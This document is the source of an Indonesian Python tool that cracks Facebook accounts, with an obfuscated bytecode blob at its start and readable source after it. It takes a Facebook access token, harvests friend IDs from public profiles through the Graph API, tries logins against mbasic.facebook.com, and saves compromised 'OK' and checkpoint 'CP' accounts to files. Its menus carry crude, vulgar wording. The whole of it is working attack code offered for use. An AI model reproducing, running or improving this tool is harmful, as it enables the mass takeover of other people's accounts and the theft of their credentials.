\x01\x12\x01\x08\x01\x08\x01\x14\x01\x08\x01\n\x01\x08\x01\n\x01\x1e\x01$\x010\x01\x06\x01\n\x01\x08\x01\n\x01\x1e\x010\x01\x04\x01\x04\x01\x08\x01\x12\x01\x12\x01\x08\x01\x10\x01\x08\x01\x10\x01\x08\x02\x08\x01$\x01\x08\x02\x08\x01\x10\x01\x10\x01\x08\x01\x08\x01$\x01*\x01\x06\x01\x02\xe5\x04\x1e\x04\xe2\x12\x1f\x0e\x01\x02\xff\x0c\x02r=\x01\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x10\x00\x00\x00C\x00\x00\x00s\xcc\x01\x00\x00d\x01}\x02d\x02d\x03d\x04d\x05d\x06|\x02d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10\x9c\x0f}\x03t\x00\xa0\x01\xa1\x00}\x04z\x94|\x04\xa0\x02d\x05\xa1\x01}\x05t\x03|\x04j\x04d\x11|\x00|\x01d\x12d\x13\x9c\x03|\x03d\x14d\x15\x8d\x04j\x05d\x16\x83\x02}\x06|\x06\xa0\x06d\x17\xa1\x01}\x07i\x00}\x08g\x00d\x18\xa2\x01}\t|\x07d\x19\x83\x01D\x00]\x16}\n|\n\xa0\x02d\x1a\xa1\x01|\tv\x00rT|\x08\xa0\x07|\n\xa0\x02d\x1a\xa1\x01|\n\xa0\x02d\x1b\xa1\x01i\x01\xa1\x01\x01\x00q>t\x03|\x04j\x04d\x05t\x08|\x07d\x1c\x19\x00\x83\x01\x17\x00|\x08|\x03d\x1d\x8d\x03j\x05d\x16\x83\x02}\x0bt\td\x1et\n|\x00|\x01t\x0bf\x04\x16\x00\x83\x01\x01\x00t\x0cd\x1ft\r\x17\x00d \x83\x02\xa0\x0e|\x00d!\x17\x00|\x01\x17\x00d"\x17\x00\xa1\x01\x01\x00t\x0fd#7\x00a\x0f|\x0b\xa0\x10d$\xa1\x01}\x0ct\x11|\x0c\x83\x01d%k\x02r\x9bt\td&t\x12t\x0bf\x02\x16\x00\x83\x01\x01\x00W\x00d\x00S\x00|\x0cD\x00]\x0c}\rt\td\'t\x13|\rj\x05t\x0bf\x03\x16\x00\x83\x01\x01\x00q\x9dW\x00d\x00S\x00\x04\x00t\x14y\xe5\x01\x00}\x0e\x01\x00z-t\td(t\n|\x00|\x01t\x0bf\x04\x16\x00\x83\x01\x01\x00t\td)t\x15t\x0bf\x02\x16\x00\x83\x01\x01\x00t\x0cd\x1ft\r\x17\x00d \x83\x02\xa0\x0e|\x00d!\x17\x00|\x01\x17\x00d"\x17\x00\xa1\x01\x01\x00t\x0fd#7\x00a\x0fW\x00Y\x00d\x00}\x0e~\x0ed\x00S\x00d\x00}\x0e~\x0ew\x01w\x00)*Nz\x88Mozilla/5.0 (Linux; U; Android 4.3; nl-nl; HTC_One Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30r<\x01\x00\x00rV\x00\x00\x00r\x1e\x00\x00\x00r-\x00\x00\x00r\xf2\x00\x00\x00\xfa|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r\xdd\x00\x00\x00r\xde\x00\x00\x00\xda\x08navigate\xfa\x02?1r\xe1\x00\x00\x00\xfa:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r\xe2\x00\x00\x00rU\x00\x00\x00r\xf3\x00\x00\x00\xfa%https://mbasic.facebook.com/login.phpr\xd4\x00\x00\x00\xa9\x03Z\x05emailr\xf0\x00\x00\x00r.\x00\x00\x00T\xa9\x03rj\x00\x00\x00r^\x00\x00\x00r\xf5\x00\x00\x00\xfa\x0bhtml.parser\xda\x04form\xa9\x05Z\x02nhr\xef\x00\x00\x00Z\x07fb_dtsgz\x10submit[Continue]Z\x0fcheckpoint_datara\x00\x00\x00r@\x00\x00\x00r\x02\x01\x00\x00\xda\x06action\xa9\x02rj\x00\x00\x00r^\x00\x00\x00\xf5\x1e\x00\x00\x00\r%s++++ %s|%s CP \xe2\x9c\x93        %sr\x86\x00\x00\x00r\xf9\x00\x00\x00r\x8c\x00\x00\x00r\xa6\x00\x00\x00r\x02\x00\x00\x00\xda\x06optionr\x01\x00\x00\x00\xfa2\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)\xfa\x0c\r%s---> %s%su\x1c\x00\x00\x00\r%s++++ %s|%s CP \xe2\x9c\x93      %sz>\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)\x16rF\x00\x00\x00r\xb7\x00\x00\x00rG\x00\x00\x00\xda\x03sopr\x1a\x01\x00\x00rJ\x00\x00\x00\xda\x04findr\x97\x00\x00\x00r\x96\x00\x00\x00r\t\x00\x00\x00\xda\x01br\x98\x00\x00\x00rB\x00\x00\x00r\xd1\x00\x00\x00re\x00\x00\x00r\x13\x01\x00\x00\xda\x08find_allr\x94\x00\x00\x00\xda\x02hh\xda\x02kkri\x00\x00\x00\xda\x01u)\x0fr\xd7\x00\x00\x00r\'\x01\x00\x00r%\x01\x00\x00\xda\x04headr\xb9\x00\x00\x00\xda\x02hi\xda\x02ho\xda\x02jorj\x00\x00\x00\xda\x04lion\xda\x03anj\xda\x04kent\xda\x04opsi\xda\x05opsii\xda\x01cr5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\x1d\x01\x00\x00\x04\x03\x00\x00s<\x00\x00\x00\x04\x02$\x01\x08\x01\x02\x01\n\x01"\x01\n\x01\x04\x01\x08\x01\x0c\x01\x0e\x01\x1a\x01\x02\x80$\x01\x14\x01 \x01\x08\x01\n\x01\x0c\x01\x16\x01\x08\x02\x16\x01\x06\xff\x0e\x02\x14\x01\x10\x01 \x01\x16\x01\x08\x80\x02\xfcr\x1d\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x11\x00\x00\x00C\x00\x00\x00s$\x03\x00\x00t\x00t\x01\x83\x01}\x00d\x01t\x02\x16\x00}\x01t\x03t\x04|\x01d\x02d\x03\x8d\x02\x83\x01\x01\x00t\x05t\x06d\x04\x17\x00t\x07\x17\x00d\x05\x17\x00t\x06\x17\x00d\x06\x17\x00\x83\x01\x01\x00d\x07}\x02t\x08\x83\x00\xa0\tt\n|\x02d\x08d\t\x8d\x02\xa1\x01\x01\x00d\n}\x03t\x01D\x00\x90\x01]Q}\x04\x90\x01z/z\x11|\x04\xa0\x0bd\x0b\xa1\x01d\n\x19\x00|\x04\xa0\x0bd\x0b\xa1\x01d\x0c\x19\x00\x02\x02}\x05}\x06W\x00n \x04\x00t\x0cyd\x01\x00\x01\x00\x01\x00t\r\xa0\x0ed\x0c\xa1\x01\x01\x00t\td\rt\x0f|\x04t\x06f\x03\x16\x00\x83\x01\x01\x00t\td\x0et\x10t\x06f\x02\x16\x00\x83\x01\x01\x00Y\x00W\x00q.w\x00t\x11\xa0\x12t\x10t\x13t\x14t\x0ft\x07t\x15g\x06\xa1\x01}\x07t\td\x0f|\x07|\x03t\x00t\x01\x83\x01|\x05t\x06f\x05\x16\x00d\x10d\x11\x8d\x02\x01\x00t\x16j\x17\xa0\x18\xa1\x00\x01\x00d\x12}\x08t\x19\xa0\x1a\xa1\x00}\td\x13d\x14d\x15d\x16d\x17|\x08d\x18d\x19d\x1ad\x1bd\x1cd\x1dd\x1ed\x1fd d!\x9c\x0f}\n|\t\xa0\x1bd\x16\xa1\x01}\x0bt\x1c|\tj\x1dd"|\x05|\x06d#d$\x9c\x03|\nd%d&\x8d\x04j\x1ed\'\x83\x02}\x0cd(|\tj\x1f\xa0 \xa1\x00\xa0!\xa1\x00v\x00\x90\x01r=zi|\x0c\xa0"d)\xa1\x01}\ri\x00}\x0eg\x00d*\xa2\x01}\x0f|\rd+\x83\x01D\x00]\x16}\x10|\x10\xa0\x1bd,\xa1\x01|\x0fv\x00r\xe2|\x0e\xa0#|\x10\xa0\x1bd,\xa1\x01|\x10\xa0\x1bd-\xa1\x01i\x01\xa1\x01\x01\x00q\xcct\x1c|\tj\x1dd\x16t$|\rd.\x19\x00\x83\x01\x17\x00|\x0e|\nd/\x8d\x03j\x1ed\'\x83\x02}\x11t\td0t\x0f|\x05|\x06t\x06f\x04\x16\x00\x83\x01\x01\x00|\x11\xa0%d1\xa1\x01}\x12t\x00|\x12\x83\x01d\nk\x02\x90\x01r\x14t\td2t\x15t\x06f\x02\x16\x00\x83\x01\x01\x00n\x10|\x12D\x00]\r}\x13t\td3t\x14|\x13j\x1et\x06f\x03\x16\x00\x83\x01\x01\x00\x90\x01q\x16W\x00n6\x01\x00\x01\x00\x01\x00t\td4t\x0f|\x05|\x06t\x06f\x04\x16\x00\x83\x01\x01\x00t\td5t\x10t\x06f\x02\x16\x00\x83\x01\x01\x00Y\x00n\x1fd6|\tj\x1f\xa0 \xa1\x00\xa0!\xa1\x00v\x00\x90\x01rRt\td7t\x07|\x05|\x06t\x06f\x04\x16\x00\x83\x01\x01\x00n\nt\td8t\x06|\x05|\x06t\x06f\x04\x16\x00\x83\x01\x01\x00|\x03d\x0c7\x00}\x03W\x00q.\x04\x00t\x19j&j\'\x90\x01y\x80\x01\x00\x01\x00\x01\x00t\td9\x83\x01\x01\x00d:}\x14t\x08\x83\x00\xa0\tt\n|\x14d\x08d\t\x8d\x02\xa1\x01\x01\x00t(\x83\x00\x01\x00Y\x00q.w\x00d;}\x15t\x08\x83\x00\xa0\tt\n|\x15d\x08d\t\x8d\x02\xa1\x01\x01\x00t(\x83\x00\x01\x00d\x00S\x00)<Nz$TURN ON %s AIRPLANE MODE 8 SECONDS \nz\x08CEK OPSIrn\x00\x00\x00rp\x00\x00\x00rq\x00\x00\x00z\x07] Mulaiz\x1c# OPTION CHECK PROCESS STARTrl\x00\x00\x00rm\x00\x00\x00r\x01\x00\x00\x00r\x8c\x00\x00\x00r\x02\x00\x00\x00z\x1e\r%s++++ %s ----> Error      %sz2\r%s---> Pemisah Tidak Didukung Untuk Program Ini%sz\x1b\r%s---> %s/%s ---> { %s }%sr\xcd\x00\x00\x00r\xda\x00\x00\x00zhMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36r<\x01\x00\x00rV\x00\x00\x00r\x1e\x00\x00\x00r-\x00\x00\x00r\xf2\x00\x00\x00r>\x01\x00\x00r\xdd\x00\x00\x00r\xde\x00\x00\x00r?\x01\x00\x00r@\x01\x00\x00r\xe1\x00\x00\x00rA\x01\x00\x00r\xe2\x00\x00\x00rU\x00\x00\x00r\xf3\x00\x00\x00rB\x01\x00\x00r\xd4\x00\x00\x00rC\x01\x00\x00TrD\x01\x00\x00rE\x01\x00\x00r\xf6\x00\x00\x00rF\x01\x00\x00rG\x01\x00\x00ra\x00\x00\x00r@\x00\x00\x00r\x02\x01\x00\x00rH\x01\x00\x00rI\x01\x00\x00rJ\x01\x00\x00rK\x01\x00\x00rL\x01\x00\x00rM\x01\x00\x00u\x1d\x00\x00\x00\r%s++++ %s|%s CP \xe2\x9c\x93       %sz#\r%s---> Tidak Dapat Mengecek Opsi%sr\xfa\x00\x00\x00u\x1b\x00\x00\x00\r%s++++ %s|%s OK \xe2\x9c\x93     %sz!\r%s++++ %s|%s ---> SALAH       %sr6\x00\x00\x00r\xaf\x00\x00\x00z\x06# DONE))r\x94\x00\x00\x00r\xa5\x00\x00\x00r\x12\x01\x00\x00r{\x00\x00\x00rz\x00\x00\x00ra\x00\x00\x00r\x98\x00\x00\x00r8\x00\x00\x00r\x7f\x00\x00\x00r\t\x00\x00\x00r\x80\x00\x00\x00r\x9b\x00\x00\x00\xda\nIndexErrorrg\x00\x00\x00rh\x00\x00\x00rP\x01\x00\x00rT\x01\x00\x00r\xc5\x00\x00\x00r\x10\x01\x00\x00\xda\x01krS\x01\x00\x00rR\x01\x00\x00r\x14\x01\x00\x00r\x15\x01\x00\x00r\x16\x01\x00\x00rF\x00\x00\x00r\xb7\x00\x00\x00rG\x00\x00\x00rN\x01\x00\x00r\x1a\x01\x00\x00rJ\x00\x00\x00r?\x00\x00\x00r\x1b\x01\x00\x00r\x1c\x01\x00\x00rO\x01\x00\x00r\x97\x00\x00\x00r\x96\x00\x00\x00rQ\x01\x00\x00rN\x00\x00\x00rO\x00\x00\x00rQ\x00\x00\x00)\x16r^\x01\x00\x00r\xcb\x00\x00\x00r\x9c\x00\x00\x00Z\x04loveZ\x03kesrA\x00\x00\x00r\'\x01\x00\x00r"\x01\x00\x00r%\x01\x00\x00r\xb9\x00\x00\x00\xda\x06headerrV\x01\x00\x00rW\x01\x00\x00rX\x01\x00\x00rj\x00\x00\x00rY\x01\x00\x00rZ\x01\x00\x00r[\x01\x00\x00r\\\x01\x00\x00r]\x01\x00\x00r\xb1\x00\x00\x00Z\x03dahr5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\xa8\x00\x00\x00#\x03\x00\x00sr\x00\x00\x00\x08\x01\x08\x01\x10\x01\x1c\x01\x04\x01\x14\x01\x04\x01\n\x01\x04\x01\x02\x01"\x01\x0c\x01\n\x01\x12\x01\x10\x01\x06\x01\x02\xfc\x16\x05(\x01\x04\x01\x08\x01$\x01\n\x01"\x01\x14\x01\x02\x01\n\x01\x04\x01\x08\x01\x0c\x01\x0e\x01\x1a\x01\x02\x80$\x01\x14\x01\n\x01\x0e\x01\x12\x01\x08\x02\x18\x01\x04\x80\x06\x01\x14\x01\x14\x01\x14\x01\x16\x01\x14\x02\x0c\x01\x12\x01\x08\x01\x04\x01\x14\x01\n\x01\x02\xfc\x04\x05\x14\x01\n\x01r\xa8\x00\x00\x00\xda\x08__main__r\x85\x00\x00\x00r\x8d\x00\x00\x00)urF\x00\x00\x00Z\x03bs4rH\x00\x00\x00r3\x00\x00\x00r\x14\x01\x00\x00r\xc5\x00\x00\x00Z\x08datetimerg\x00\x00\x00rc\x00\x00\x00\xda\nsubprocessZ\x04rich\xda\x0bImportErrorr4\x00\x00\x00rh\x00\x00\x00rQ\x00\x00\x00Z\nrich.tabler\x03\x00\x00\x00\xda\x02meZ\x0crich.consoler\x04\x00\x00\x00r\x7f\x00\x00\x00r\x05\x00\x00\x00rN\x01\x00\x00Z\x12concurrent.futuresr\x06\x00\x00\x00r\xd2\x00\x00\x00r\x07\x00\x00\x00Z\x02gpZ\nrich.panelr\x08\x00\x00\x00rz\x00\x00\x00\xda\x06base64r\t\x00\x00\x00r{\x00\x00\x00Z\rrich.markdownr\n\x00\x00\x00r\x80\x00\x00\x00Z\x0crich.columnsr\x0b\x00\x00\x00r\xbb\x00\x00\x00r\x19\x01\x00\x00r\x18\x01\x00\x00r\x17\x01\x00\x00rA\x00\x00\x00r\xc4\x00\x00\x00r\x11\x01\x00\x00r\x12\x01\x00\x00r\x13\x01\x00\x00r\xa5\x00\x00\x00r\xc9\x00\x00\x00r\xc7\x00\x00\x00Z\tlisensikur\xc8\x00\x00\x00rD\x00\x00\x00r\xb4\x00\x00\x00Z\x0blisensikuni\xda\x01Kr\x1e\x01\x00\x00rb\x00\x00\x00r\x98\x00\x00\x00r`\x01\x00\x00r8\x00\x00\x00rR\x01\x00\x00rT\x01\x00\x00rS\x01\x00\x00rP\x01\x00\x00r(\x01\x00\x00Z\x0bheader_grupZ\x03dicZ\x04dic2Z\nurl_lookupZ\x06url_mbZ\x06url_ipZ\turl_graphZ\x04aedxZ\x04ssssZ\x04ddddZ\x04aaaaZ\x04bbbbZ\x04awssZ\x04cuiiZ\x04mmkkZ\x04ccccZ\x04uvgoZ\x04hhhhZ\x07proxiesZ\x06bahasar%\x01\x00\x00Z\x03nowZ\x03dayZ\x03tglr\x96\x00\x00\x00Z\x05monthZ\x03blnZ\x04yearZ\x03thnr\xd0\x00\x00\x00r\xd1\x00\x00\x00r2\x00\x00\x00r7\x00\x00\x00r9\x00\x00\x00r.\x00\x00\x00rM\x00\x00\x00rK\x00\x00\x00r~\x00\x00\x00r\xab\x00\x00\x00r|\x00\x00\x00r}\x00\x00\x00r\xb0\x00\x00\x00r\xca\x00\x00\x00r\xd5\x00\x00\x00r\xd6\x00\x00\x00r=\x01\x00\x00r\x1d\x01\x00\x00r\xa8\x00\x00\x00\xda\x08__name__\xda\x05mkdirr5\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\xa0\x00\x00\x00P\x07\x02\x01\x0c\x01\x0c\x01\n\x01\n\x01\x02\x01\x0c\x01\x0c\x01\x0c\x01\x02\xff\x04\x80\x02\xfb\x0c\x07\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x0c\x01\x08\x01\x0c\x01\x0c\x01\x0c\x01\x06\x05\x06\x02\x08\x038\x02\x04\x03\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x04\x01\x08\x02\x1e\x01\x1e\x01\x04\x02\x04\x01\x04\x01\x04\x01\x0c\x03\x0c\x02\n\x02\x04\x01\x04\x01\x04\x03\x0c\x02\x14\x01\x0c\x01(\x01(\x01\x08\x02\x08\x03\x08\x03\x08\x15\x08\x14\x08\x11\x08\x1d\x08~\x08A\x08\x1f\x08@\x089\x08)\x08G\x08G\x08H\x08\x1f\n:\x10\x01\x08\x01\x10\x01\x08\x01\n\x01\x04\xfb'))
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
    
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print("""%s
	

┌────────────────────────────────────────────────────────┐
│                                                        │
│███╗   ███╗ ██████╗ ███╗   ██╗██╗   ██╗███████╗████████╗│
│████╗ ████║██╔═══██╗████╗  ██║╚██╗ ██╔╝██╔════╝╚══██╔══╝│
│██╔████╔██║██║   ██║██╔██╗ ██║ ╚████╔╝ █████╗     ██║   │
│██║╚██╔╝██║██║   ██║██║╚██╗██║  ╚██╔╝  ██╔══╝     ██║   │
│██║ ╚═╝ ██║╚██████╔╝██║ ╚████║   ██║   ███████╗   ██║   │
│╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝   ╚═╝   │
│                                     
└────────────────────────────────────────────────────────┘
\33[1;33m──────────────────────────────────────────────────────────
\33[1;33m  \33[mCREATOR AMIR
\33[1;33m  \33[mGUNAKAN DENGAN BIJAK NYET
\33[1;33m  \33[mPECINTA PERAWAN PINK
\33[1;33m  \33[ : \33[1;33mFREE
\33[1;33m────────────────────────────────────────────────────────
"""%(kk))

def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				menu(sy2)
			except KeyError:
				login_kontol()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# KONEKSI INTERNET BERMASALAH'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_kontol()

def login_kontol():
	banner()
	print("""%s ═════════════════════════════════════════════════════════ """%(h))
	print("""%s    \33[1;32mMASUKAN TOKEN FACEBOOK """%(h))
	print("""%s ═════════════════════════════════════════════════════════ """%(h))
	panda = input(x+'\33[1;96m•Token> ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['name']
		print("""%s \n"""%(h))
		print("""%s ════════════════════════════════════════════════════════ """%(h))
		jalan('%s╚══[%s✓%s] %s\33[1;96mLOGIN BERHASIL JALANKAN ULANG TOOLS'%(M,P,M,P))
		print("""%s ════════════════════════════════════════════════════════ """%(h))
		print("""%s \33[1;96mJalan kan perintah python memek.py """%(h))
		time.sleep(2.5)
		exit()
	except KeyError:
		print("""%s \n"""%(h))
		jalan('%s╚══[%s!%s] %sLOGIN GAGAL CEK AKUN TUMBAL ANDA'%(M,P,M,P))
		time.sleep(2.5)
		login_kontol()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='yellow')
		sol().print(lo, style='cyan')
		exit()
		
def menu(my_name):
	banner()
	print(x+'\33[m[~_~]\033[96mNAMA  : \33[m'+str(my_name))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[m[01] \33[1;33m """%(h))
	print("""%s \33[m[02] \33[1;33mCEK HASIL CRACK """%(h))
	print("""%s \33[m[03] \33[1;33mCEK OPSI CP """%(h))
	print("""%s \33[m[00] \33[mLOG-OUT"""%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	jh = input(x+'\33[m[?] \33[1;96mInput Number> ')
	if jh in ['1','01']:
		dump_massal()
	elif jh in ['2','02']:
		result()
	elif jh in ['3','03']:
		file()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print(x+'\33[1;96m•Sabar Nunggu Ojek ...')
		time.sleep(1)
		print("""%s \33[1;33mSUKSES KELUAR CROTT AHH """%(h))
		exit()
	else:
		print("""%s \33[1;33mNgajak gelud om pilih yang bener """%(h))
		exit()

def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL OK ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='blue'))
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()

def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()


def dump_massal():
	clear()
	banner()
	print("""%s  \33[m[~_~]\33[1;32mCRACK DARI ID AKUN PUBLIK\33[m[~_~]"""%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print(x+'\33[m[ ! ] \33[1;96mMASUKKAN JUMLAH ID CRACK [ limit 15 ]')
	try:
		jum = int(input(x+'\33[m[ ? ] \33[1;96mMAU CRACK BERAPA ID ? '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# MASUKAN JUMLAH ID OM BUKAN ID NYA'
		pesan2 = mark(pesan, style='yellow')
		sol().print(pesan2)
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(x+'\33[m[ ? ] \33[1;96m•MASUKAN ID KE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
